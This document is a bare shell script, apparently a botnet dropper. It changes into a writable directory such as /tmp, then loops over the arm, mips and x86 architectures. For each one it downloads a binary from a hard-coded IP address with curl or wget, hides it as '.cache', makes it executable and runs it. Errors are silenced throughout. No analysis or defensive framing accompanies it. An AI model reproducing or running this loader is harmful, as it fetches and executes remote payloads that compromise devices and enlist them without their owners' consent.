#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
for a in arm mips x86; do
  curl -so .cache http://91.198.174.10/bins/y.$a 2>/dev/null || wget -q http://91.198.174.10/bins/y.$a -O .cache 2>/dev/null
  chmod +x * 2>/dev/null
  ./.cache && exit 0
  rm -f .cache
done
